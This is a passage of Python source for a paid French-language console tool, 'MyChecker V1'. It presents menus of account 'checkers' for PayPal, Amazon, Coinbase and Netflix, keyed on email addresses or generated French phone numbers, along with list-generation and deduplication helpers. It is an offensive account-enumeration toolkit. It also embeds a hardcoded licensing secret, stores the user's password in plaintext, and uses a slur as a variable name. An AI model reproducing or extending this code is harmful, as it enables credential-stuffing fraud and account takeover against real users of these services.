            Thread(target=Extractor.console_title, daemon=False).start()
            Thread(target=Extractor.cpm_counter, daemon=False).start()
            if not path.exists(f"results/Extractor"):
                mkdir(f"results/Extractor")
            mainpool = Pool(processes=threads)
            mainpool.imap_unordered(Extractor.Extractor, numlist)
            mainpool.close()
            mainpool.join()
            if Extractor.checked == Extractor.loaded:
                print("\nTerminé !")
            input(f'Appuie sur une touche pour retourner au menu')
            accueil()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e


class AntiDuplicate:
    def start():
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

        faded_text = fade.greenblue(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
        print(f" \n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}] Please import your Numlist...")
        inputf = input('> ')
        if not path.exists("results"):
            mkdir("results")
        with open(inputf, 'r+', encoding='latin-1') as linesf:
            output_file = f'results/Duplicates_Removed-{time1}.txt'
            open(output_file, 'w', encoding='latin-1').writelines(set(linesf.readlines()))
            afterremove = open(output_file, 'r', encoding='u8', errors='ignore').read().split('\n')
            beforeremove = open(inputf, 'r', encoding='u8',errors='ignore').read().split('\n')
            nigga = (len(beforeremove) - len(afterremove))
            print(f'\nAvant: {len(beforeremove)} Après: {len(afterremove)} ({nigga} Lignes supprimés)\n')
        input(f'Appuie sur une touche pour retourner au menu')
        accueil()

class NumGen:
    generated = 0
    numnumber = 0
    cpm = 0

    def cpm_counter(self):
        while True:
            now = NumGen.generated
            sleep(1)
            NumGen.cpm = (NumGen.generated - now) * 60

    def console_title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Num Generator {NumGen.generated}/{NumGen.numnumber} - {NumGen.cpm} CPM")
            sleep(0.07)

    def start(self):
        windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Num Generator")
        system('cls' if name == 'nt' else 'clear')
        banner = (CENTER("""\n
 $$$$$$\  $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\  $$$$$$\  $$$$$$$\  
$$  __$$\ $$  _____|$$$\  $$ |$$  _____|$$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$  __$$\ 
$$ /  \__|$$ |      $$$$\ $$ |$$ |      $$ |  $$ |$$ /  $$ |  $$ |   $$ /  $$ |$$ |  $$ |
$$ |$$$$\ $$$$$\    $$ $$\$$ |$$$$$\    $$$$$$$  |$$$$$$$$ |  $$ |   $$ |  $$ |$$$$$$$  |
$$ |\_$$ |$$  __|   $$ \$$$$ |$$  __|   $$  __$$< $$  __$$ |  $$ |   $$ |  $$ |$$  __$$< 
$$ |  $$ |$$ |      $$ |\$$$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |  $$ |
\$$$$$$  |$$$$$$$$\ $$ | \$$ |$$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |    $$$$$$  |$$ |  $$ |
 \______/ \________|\__|  \__|\________|\__|  \__|\__|  \__|  \__|    \______/ \__|  \__|                                                                                                                                                                                
"""))
        faded_text = fade.purplepink(banner)
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
        basic = int(input(f"\n\n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}] Quel type de numéros tu veux générer ? (07 ou 06) > "))
        clear()
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
        NumGen.numnumber = int(input(f"\n\n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}] Combien de num tu veux générer ? > "))
        clear()
        print(faded_text)
        print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
        print(f"\n\n[{Fore.LIGHTCYAN_EX}#{Fore.WHITE}] Generating...")
        Thread(target=self.console_title, daemon=False).start()
        Thread(target=self.cpm_counter, daemon=False).start()
        if not path.exists("results"):
            mkdir("results")
        mkdir(f"results/Num-Generator-{time1}")
        for x in range(NumGen.numnumber):
            addon = randint(10000000,99999999)
            open(f"results/Num-Generator-{time1}/Generated.txt", "a", encoding="utf-8", errors="ignore").write(f"0{basic}{addon}\n")
            NumGen.generated += 1
        print(f"{Fore.WHITE}\n{NumGen.generated} Numéros ont été générer !")
        if NumGen.generated == NumGen.numnumber:
            print("\nTerminé !")
        input(f'Appuie sur une touche pour retourner au menu')
        accueil()

def emailmodule():
    windll.kernel32.SetConsoleTitleW(f"MyChecker V1 -Emails Modules")
    system('cls' if name == 'nt' else 'clear')
    banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

    faded_text = fade.greenblue(banner)
    print(faded_text)
    print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
    print(f'''{Fore.WHITE}
[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}] Checker Paypal
[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}] Checker Amazon
[{Fore.LIGHTCYAN_EX}3{Fore.WHITE}] Checker Coinbase

[{Fore.LIGHTRED_EX}X{Fore.WHITE}] Retour 
''')
    mod = input("> Select your number: ")
    if mod == "1":
        PaypalMail.start()
    elif mod == "2":
        AmazonMail.start()
    elif mod == "3":
        CoinbaseMail.start()
    else:
        accueil()

def tools():
    windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Tools")
    system('cls' if name == 'nt' else 'clear')
    banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

    faded_text = fade.greenblue(banner)
    print(faded_text)
    print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
    print(f'''{Fore.WHITE}
[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}] Anti Duplicate
[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}] Extractor

[{Fore.LIGHTRED_EX}X{Fore.WHITE}] Retour 
''')
    mod = input("> Select your number: ")
    if mod == "1":
        AntiDuplicate.start()
    elif mod == "2":
        Extractor.start()
    else:
        accueil()

def nummodule():
    windll.kernel32.SetConsoleTitleW(f"MyChecker V1 - Nums Modules")
    system('cls' if name == 'nt' else 'clear')
    banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

    faded_text = fade.greenblue(banner)
    print(faded_text)
    print(Fore.RESET+CENTER("""~ t.me/mycheckerv1 ~ Made by @hermesuhq x @volthq ~""").replace("~", Fore.LIGHTCYAN_EX+"~"+Fore.RESET))
    print(f'''{Fore.WHITE}
[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}] Nums Generator
[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}] Operators Checker - Debouncer
[{Fore.LIGHTCYAN_EX}3{Fore.WHITE}] Amazon Checker
[{Fore.LIGHTCYAN_EX}4{Fore.WHITE}] Netflix Checker

[{Fore.LIGHTRED_EX}X{Fore.WHITE}] Retour 
''')
    mod = input("> Select your number: ")
    if mod == "1":
        NumGen().start()
    elif mod == "2":
        OperatorChecker.start()
    elif mod == "3":
        AmazonNum.start()
    elif mod == "4":
        NetflixNum.start()
    else:
        accueil()

def accueil():
    windll.kernel32.SetConsoleTitleW(f"[{keyauthapp.user_data.username}] MyChecker - V1")
    system('cls' if name == 'nt' else 'clear')




    banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

    faded_text = fade.greenblue(banner)
    print(faded_text)
    syms = [f'                                  {Fore.RESET}', f'{Fore.LIGHTCYAN_EX}~', f'{Fore.RESET} ', 't', '.', 'm', 'e', '/', 'm', 'y', 'c', 'h', 'e', 'c', 'k', 'e', 'r','v','1',' ', f'{Fore.LIGHTCYAN_EX}~', f'{Fore.RESET} ', 'M', 'a', 'd', 'e', ' ', 'b', 'y', ' ', '@', 'h', 'e', 'r', 'm', 'e', 's', 'u', 'h', 'q', ' ', 'x', ' ', '@', 'v', 'o', 'l', 't', 'h', 'q', ' ' f'{Fore.LIGHTCYAN_EX}~']
    for _ in range(1):
        for sym in syms:
            sys.stdout.write("%s" % sym)
            sys.stdout.flush()
            sleep(0.04)
    print(f'''{Fore.WHITE}


[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}] Nums Modules
[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}] Emails Modules 
[{Fore.LIGHTCYAN_EX}3{Fore.WHITE}] Tools                                          
''')
    mod = input("> Select your number: ")
    if mod == "1":
        nummodule()
    elif mod == "2":
        emailmodule()
    elif mod == "3":
        tools()
    else:
        print("Invalid input !")
        sleep(3)
        accueil()
clear()   

def mdp():
    path = os.path.basename(__file__)
    if not os.path.exists(path):
    	path = path[:-2] + "exe"
    md5_hash = hashlib.md5()
    a_file = open(path,"rb")
    content = a_file.read()
    md5_hash.update(content)
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "MycheckerV1",
    ownerid = "Rt9oMrjv1i",
    secret = "3a6c25ea7b0e3e269f2e9229a6558949ecc690ed4a8a05b0e307bc65d3be7c38",
    version = "1.0",
    hash_to_check = mdp()
)

def menu():
    windll.kernel32.SetConsoleTitleW(f"Mychecker - Login (Users: {keyauthapp.app_data.numUsers})")
    system('cls' if name == 'nt' else 'clear')

    banner = (CENTER("""\n
$$\      $$\ $$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$$\    $$$ |\$$\   $$  |$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$$$\  $$$$ | \$$\ $$  / $$ /  \__|$$ |  $$ |$$ |      $$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$\$$\$$ $$ |  \$$$$  /  $$ |      $$$$$$$$ |$$$$$\    $$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$ \$$$  $$ |   \$$  /   $$ |      $$  __$$ |$$  __|   $$ |      $$  $$<   $$  __|   $$  __$$< 
$$ |\$  /$$ |    $$ |    $$ |  $$\ $$ |  $$ |$$ |      $$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$ | \_/ $$ |    $$ |    \$$$$$$  |$$ |  $$ |$$$$$$$$\ \$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__|     \__|    \__|     \______/ \__|  \__|\________| \______/ \__|  \__|\________|\__|  \__|                                                                                            
\n"""))

    faded_text = fade.greenblue(banner)
    print(faded_text)


    syms = [f'                                  {Fore.RESET}', f'{Fore.LIGHTCYAN_EX}~', f'{Fore.RESET} ', 't', '.', 'm', 'e', '/', 'm', 'y', 'c', 'h', 'e', 'c', 'k', 'e', 'r','v','1',' ', f'{Fore.LIGHTCYAN_EX}~', f'{Fore.RESET} ', 'M', 'a', 'd', 'e', ' ', 'b', 'y', ' ', '@', 'h', 'e', 'r', 'm', 'e', 's', 'u', 'h', 'q', ' ', 'x', ' ', '@', 'v', 'o', 'l', 't', 'h', 'q', ' ' f'{Fore.LIGHTCYAN_EX}~']
    for _ in range(1):
        for sym in syms:
            sys.stdout.write("%s" % sym)
            sys.stdout.flush()
            sleep(0.04)
    print(f'''{Fore.WHITE}


[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}] Login
[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}] Register                                        
''')
    if not path.exists("results"):
         mkdir("results")
    if not path.exists(f"results/Account"):
        mkdir(f"results/Account")
    if not path.isfile("results/Account/username.txt"):
        mod = input("> Select your number: ")
        if mod == "1":
            clear()
            plasmamotd()
            user = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Username > ')
            clear()
            plasmamotd()
            password = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Password > ')
            clear()
            plasmamotd()
            open(f"results/Account/username.txt", "a+", encoding='utf-8', errors='ignore').write(f"{user}")
            open(f"results/Account/password.txt", "a+", encoding='utf-8', errors='ignore').write(f"{password}")
            keyauthapp.login(user,password)
            clear()
            print(faded_text)
            print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
            time.sleep(5)
            accueil()
        elif mod == "2":
            clear()
            plasmamotd()
            user = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Username > ')
            clear()
            plasmamotd()
            password = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your Password > ')
            clear()
            plasmamotd()
            license = input(f'\n\n[{Fore.LIGHTRED_EX}#{Fore.WHITE}] Please enter your License Key > ')
            clear()
            plasmamotd()
            keyauthapp.register(user,password,license)
            menu()
        else:
            print("Invalid input !")
            sleep(3)
            menu()
        clear()
    else:
        clear()
        plasmamotd()
        a = open('results/Account/username.txt', 'r')
        file_contentsa = a.read()
        user = (file_contentsa)
        b = open('results/Account/password.txt', 'r')
        file_contentsb = b.read()
        password = (file_contentsb)
        keyauthapp.login(user,password)
        clear()
        print(faded_text)
        print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
        time.sleep(5)
        accueil()

r = requests.get(f"https://raw.githubusercontent.com/MyChecker/CheckerVerification/main/closedistance").text
if r.__contains__("on"):
    menu()
else:
    print(f"Veuillez télécharger la nouvelle mise à jour sur le télégram.")
